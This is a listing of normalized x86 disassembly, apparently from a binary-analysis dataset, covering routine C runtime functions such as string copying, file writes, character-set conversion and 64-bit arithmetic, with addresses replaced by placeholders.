push [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call sub_42f20e
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
add esp 0x24
call sub_42fac0
leave
retn
sub_42f2b0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_42f2c0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_42f3a8
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov ecx [ edx + 0xc ]
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_42daa0
inc eax
push eax
push edi
push esi
call sub_429090
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_42f41f
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x6 ]
push ebx
push esi
push edi
mov edi 0x7ff
mov esi 0x80000000
mov [ ebp - 0x4 ] esi
mov ecx eax
shr ecx 0x4
and eax 0x8000
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
and eax 0xfffff
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
shl edx 0x1
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
test esi edx
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
test esi ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_42f4d9
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push esi
mov [ ebp - 0x4 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42f41f
pop ecx
pop ecx
push rw-data
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_430c0f
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
mov [ rw-data ] eax
movsx eax [ rw-data ]
mov [ rw-data ] eax
movsx eax [ rw-data ]
mov [ rw-data ] eax
add esp 0x18
mov [ rw-data ] rw-data
mov eax rw-data
call sub_42fac0
pop edi
pop esi
leave
retn
sub_42f55c
xor eax eax
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or eax 0x8
test bl 0x10
je r-xdata
or eax 0x4
test bl 0x20
je r-xdata
or eax 0x2
test bl 0x2
je r-xdata
or eax 0x1
push ebp
movzx edx bx
push esi
mov ecx edx
mov esi 0xc00
and ecx esi
push edi
mov edi 0x300
mov ebp 0x200
je r-xdata
or eax 0x80000
and edx edi
je r-xdata
cmp ecx 0x400
je r-xdata
or eax 0x20000
cmp edx ebp
jne r-xdata
or eax 0x100
cmp ecx 0x800
je r-xdata
retn
or eax 0x40000
test bh 0x10
pop edi
pop esi
pop ebp
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp ecx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_42f5ee
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
test ebx 0x40000
pop esi
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_42f67c
push ebp
mov ebp esp
push ecx
push ebx
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
call sub_42f55c
mov ebx eax
mov eax [ ebp + 0xc ]
not eax
and ebx eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or ebx eax
call sub_42f5ee
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
mov eax ebx
pop ebx
leave
retn
sub_42f6c4
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
push ebx
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x3
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
push eax
call sub_430f7c
cmp eax 0xffffffff
pop ecx
je r-xdata
mov [ rw-data ] 0x9
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
mov eax [ edi ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax ebx
jmp r-xdata
push eax
call sub_430ea3
pop ecx
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
or eax 0xffffffff
sub_42f750
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ rw-data ]
push ebx
push esi
mov [ ebp - 0x4 ] eax
push edi
jae r-xdata
and [ rw-data ] 0x0
mov eax ecx
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
mov esi ecx
and esi 0x1f
shl esi 0x3
mov al [ eax + esi + 0x4 ]
test al 0x1
mov [ ebp - 0x18 ] ebx
je r-xdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x14 ] edi
jne r-xdata
test al 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push edi
push ecx
call sub_430fb8
add esp 0x10
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_42fac0
leave
retn
push edi
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp + 0xc ]
lea eax [ ebp - 0x41c ]
mov eax [ ebp - 0xc ]
cmp eax edi
jne r-xdata
mov [ rw-data ] 0x1c
mov [ rw-data ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x41c ]
sub edi eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push edi
lea eax [ ebp - 0x41c ]
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
sub eax [ ebp - 0x14 ]
jmp r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x10 ]
add [ ebp - 0xc ] eax
cmp eax edi
jl r-xdata
mov ebx [ ebp - 0x18 ]
mov [ eax ] dl
inc eax
inc edi
cmp edi 0x400
jl r-xdata
inc [ ebp - 0x14 ]
mov [ eax ] 0xd
inc eax
inc edi
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x8 ]
sub eax [ ebp + 0xc ]
xor edi edi
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_430ea3
pop ecx
jmp r-xdata
mov [ rw-data ] eax
jmp r-xdata
jmp r-xdata
mov [ rw-data ] 0x9
sub_42f904
inc [ rw-data ]
push 0x1000
call sub_429a56
test eax eax
pop ecx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_42f96f
mov eax [ rw-data ]
test eax eax
push esi
push 0x14
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_429969
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_429969
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
xor edx edx
mov ecx rw-data
or [ ecx ] 0xffffffff
test eax eax
jne r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov esi edx
and esi 0x1f
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_42fa29
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
jne r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
push esi
push [ rw-data ]
mov [ ebp + 0x8 ] esi
push eax
push 0x1
lea eax [ ebp + 0xc ]
push eax
push esi
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
cmp eax esi
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
pop esi
pop ebp
retn
mov [ rw-data ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] esi
je r-xdata
mov [ eax ] cl
xor eax eax
inc eax
jmp r-xdata
sub_42fad0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_42fb65
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_42f904
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_43135d
add esp 0xc
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
cmp ecx 0xffffffff
push edi
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
mov edi [ edi * 4 + rw-data ]
and ecx 0x1f
lea edi [ edi + ecx * 8 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or edx 0x2000
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
and cl 0x82
cmp cl 0x82
pop edi
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_42fc43
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx 0xffffffff
push esi
je r-xdata
or eax 0xffffffff
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_42f904
pop ecx
test al 0x2
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_42fcaf
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov al [ esi ]
cmp al bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ax al
mov [ ecx ] ax
jmp r-xdata
cmp [ ebp + 0x10 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
pop esi
pop ebx
pop ebp
retn
mov [ rw-data ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x1 ] bl
jne r-xdata
jb r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
sub_42fd80
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_42fdb4
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call eax
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x4
jb r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x2
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp + 0x12 ] 0x4
jmp r-xdata
or [ ebp + 0x12 ] 0x20
jmp r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
push ebx
call eax
mov ebx eax
push r--data
push edi
call esi
mov [ rw-data ] eax
sub_42feb0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_42ffd4
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
xor eax eax
inc eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + r--data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_430016
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_430045
push edi
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_43006e
push ebp
mov ebp esp
sub esp 0x518
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push esi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x18 ]
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
mov esi 0x100
jne r-xdata
xor eax eax
xor eax eax
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x118 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0x12 ]
test al al
mov [ ebp - 0x118 ] 0x20
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
push [ rw-data ]
lea eax [ ebp - 0x518 ]
push [ rw-data ]
push eax
push esi
lea eax [ ebp - 0x118 ]
push eax
push 0x1
call sub_42ed46
push 0x0
push [ rw-data ]
lea eax [ ebp - 0x218 ]
push esi
push eax
push esi
lea eax [ ebp - 0x118 ]
push eax
push esi
push [ rw-data ]
call sub_42bcec
push 0x0
push [ rw-data ]
lea eax [ ebp - 0x318 ]
push esi
push eax
push esi
lea eax [ ebp - 0x118 ]
push eax
push 0x200
push [ rw-data ]
call sub_42bcec
add esp 0x5c
xor eax eax
push ebx
lea edx [ ebp - 0x11 ]
push edi
cmp eax 0x41
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop esi
call sub_42fac0
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test cl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov cl [ ebp + eax - 0x218 ]
inc edx
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub ecx eax
inc ecx
mov ebx ecx
shr ecx 0x2
lea edi [ ebp + eax - 0x118 ]
mov eax 0x20202020
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov cl [ ebp + eax - 0x318 ]
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov cx [ ebp + eax * 2 - 0x518 ]
test cl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] cl
jmp r-xdata
sub_430200
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi 0xfffffffe
mov [ ebp - 0x4 ] eax
push edi
mov [ rw-data ] ebx
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] eax
mov esi eax
cmp esi [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
xor eax eax
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_42fac0
leave
retn
call sub_430045
xor edx edx
xor eax eax
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea ecx [ edx + edx * 2 ]
shl ecx 0x4
mov [ ebp - 0x8 ] ebx
stosb [ edi ]
lea ebx [ ecx + rw-data ]
add eax 0x30
inc edx
cmp eax 0xf0
jb r-xdata
test al al
jne r-xdata
cmp [ eax + rw-data ] esi
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
mov dl [ esi + 0x1 ]
test dl dl
je r-xdata
inc [ ebp - 0x8 ]
add ebx 0x8
cmp [ ebp - 0x8 ] 0x4
jb r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
stosb [ edi ]
xor edi edi
inc edi
cmp [ ebp - 0x1c ] edi
mov [ rw-data ] esi
mov [ rw-data ] ebx
jbe r-xdata
movzx eax al
movzx edi dl
cmp eax edi
ja r-xdata
mov al [ ebx ]
mov esi ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] 0x1
call sub_430016
lea esi [ ecx + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x16 ] 0x0
je r-xdata
inc esi
inc esi
mov al [ esi ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + rw-data ]
call sub_43006e
mov eax edi
lea ecx [ ebp - 0x15 ]
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
